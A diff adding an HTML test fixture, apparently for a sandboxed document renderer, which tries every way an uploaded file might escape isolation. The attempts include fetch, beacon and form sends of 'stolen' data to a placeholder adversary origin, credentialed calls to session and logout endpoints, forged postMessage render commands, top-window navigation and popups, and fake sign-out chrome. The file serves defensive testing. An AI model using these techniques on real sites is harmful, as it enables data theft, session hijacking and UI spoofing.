@@ -1,0 +1,146 @@
+<!doctype html>
+<!--
+  A hostile artifact: everything an uploaded document might try.
+
+  This is authored content, not product code. It is published through the real
+  path -- a real start, a real approval in a real browser, a real upload -- and
+  then rendered by the real renderer, because the claim under test is about what
+  the isolation does with arbitrary bytes rather than about what a policy string
+  says.
+
+  Two placeholders are substituted by the runner before publication, because
+  the origins only exist once the servers are listening:
+
+    __APP_ORIGIN__        the account application this artifact must not reach
+    __ADVERSARY_ORIGIN__  a third origin that records everything that arrives
+
+  What makes this fixture worth having is that its failures are observable from
+  outside it. It cannot report on itself -- it has no network and no channel out
+  -- so every attempt below is designed to leave a mark somewhere a test can
+  read: a request at a server that must stay empty, a refusal counter on the
+  renderer, a property on a window it must not be able to touch.
+
+  It deliberately does NOT test "no bytes can ever escape". C4 says the sandbox
+  removes the artifact's authority over the account origin; it does not claim to
+  be network-proof, and asserting an absolute would be asserting something the
+  design does not promise.
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Hostile artifact</title>
+    <!-- A `base` element, which would repoint every relative URL in the
+         document. The trusted prelude's policy denies `base-uri`. -->
+    <base href="__ADVERSARY_ORIGIN__/base/" />
+    <!-- A policy of the artifact's own. A `meta` policy can only intersect with
+         what the document already inherits, so this must not widen anything. -->
+    <meta http-equiv="Content-Security-Policy" content="default-src *; connect-src *; img-src *" />
+  </head>
+  <body>
+    <h1>Hostile artifact</h1>
+
+    <!-- Remote subresources. Each one is a beacon: if any of them is fetched,
+         the adversary server records it and the test fails. -->
+    <img src="__ADVERSARY_ORIGIN__/beacon/img" alt="" width="1" height="1" />
+    <script src="__ADVERSARY_ORIGIN__/beacon/script"></script>
+    <link rel="stylesheet" href="__ADVERSARY_ORIGIN__/beacon/style" />
+    <object data="__ADVERSARY_ORIGIN__/beacon/object"></object>
+
+    <!-- A form, which is neither a fetch nor a subresource and is the classic
+         way out when both are closed. -->
+    <form id="exfil" method="GET" action="__ADVERSARY_ORIGIN__/beacon/form">
+      <input type="hidden" name="stolen" value="1" />
+      <button type="submit">submit</button>
+    </form>
+
+    <!-- Regions dressed as the trusted shell. The artifact may render whatever
+         it likes inside its own frame; what it may not do is be mistaken for
+         the account page's own controls, which live outside this frame. -->
+    <header class="chrome">
+      <h1 class="doc-title" data-archon-title>Not the real title</h1>
+      <p class="owner" data-archon-owner>Signed in as somebody-else</p>
+      <button type="button" data-archon-signout>Sign out</button>
+    </header>
+
+    <script>
+      /* Every attempt is wrapped: the point is to make all of them, not to stop
+         at the first one the browser refuses. */
+      function attempt(name, body) {
+        try {
+          body();
+        } catch (error) {
+          /* Refusals are the expected outcome and are not reported anywhere --
+             there is nowhere to report them to. */
+        }
+      }
+
+      /* 1. The window above. Reading it, writing it, and marking it. */
+      attempt("parent-document", function () { void parent.document.title; });
+      attempt("top-document", function () { void top.document.cookie; });
+      attempt("parent-mark", function () { parent.__pwned = true; });
+      attempt("top-mark", function () { top.__pwned = true; });
+      attempt("opener", function () { void opener.document; });
+
+      /* 2. The account origin, credentialed and not. `connect-src 'none'`
+            denies the request outright and the sandbox denies the cookies, so
+            neither of these may reach the application server. */
+      attempt("fetch-account", function () {
+        fetch("__APP_ORIGIN__/api/hosted/session?from=artifact", { credentials: "include" });
+      });
+      attempt("fetch-mutate", function () {
+        fetch("__APP_ORIGIN__/api/hosted/auth/logout?from=artifact", {
+          method: "POST",
+          credentials: "include",
+        });
+      });
+      attempt("fetch-adversary", function () {
+        fetch("__ADVERSARY_ORIGIN__/beacon/fetch", { method: "POST", body: "stolen" });
+      });
+      attempt("beacon", function () {
+        navigator.sendBeacon("__ADVERSARY_ORIGIN__/beacon/sendBeacon", "stolen");
+      });
+      attempt("websocket", function () {
+        new WebSocket("__ADVERSARY_ORIGIN__/beacon/ws".replace("http", "ws"));
+      });
+
+      /* 3. Forged renderer messages, in both directions and in the contract's
+            own words. The renderer accepts a message only from its exact parent
+            window at the exact application origin; this window is neither. */
+      attempt("forge-ready", function () {
+        parent.postMessage({ type: "archon:ready", v: 1 }, "*");
+      });
+      attempt("forge-render", function () {
+        parent.postMessage(
+          { type: "archon:render", v: 1, html: "<h1>replaced</h1>" },
+          "*",
+        );
+      });
+      attempt("forge-top", function () {
+        top.postMessage({ type: "archon:render", v: 1, html: "<h1>replaced</h1>" }, "*");
+      });
+      /* A bounded flood: the renderer's refusal log is a set and its counter is
+         an integer, so this must cost it constant work per message. */
+      attempt("flood", function () {
+        for (var i = 0; i < 200; i += 1) parent.postMessage({ type: "archon:render", v: 1, i: i }, "*");
+      });
+
+      /* 4. Taking the tab. Top navigation, a popup and a self-submitting form
+            are three different capabilities and the sandbox withholds all
+            three. */
+      attempt("top-navigate", function () { top.location = "__ADVERSARY_ORIGIN__/beacon/top"; });
+      attempt("parent-navigate", function () { parent.location.href = "__ADVERSARY_ORIGIN__/beacon/parent"; });
+      attempt("popup", function () { window.open("__ADVERSARY_ORIGIN__/beacon/popup", "_blank"); });
+      attempt("form-submit", function () { document.getElementById("exfil").submit(); });
+
+      /* 5. Storage and identity on this origin. The frame is opaque-origin, so
+            there is no cookie jar and no storage to reach. */
+      attempt("storage", function () { localStorage.setItem("stolen", "1"); });
+      attempt("cookie", function () { document.cookie = "stolen=1"; });
+
+      /* A marker the test can read from inside the frame: the script ran to the
+         end, so an empty adversary log means "every attempt was refused" rather
+         than "the script never executed". */
+      document.body.setAttribute("data-hostile-ran", "true");
+    </script>
+  </body>
+</html>
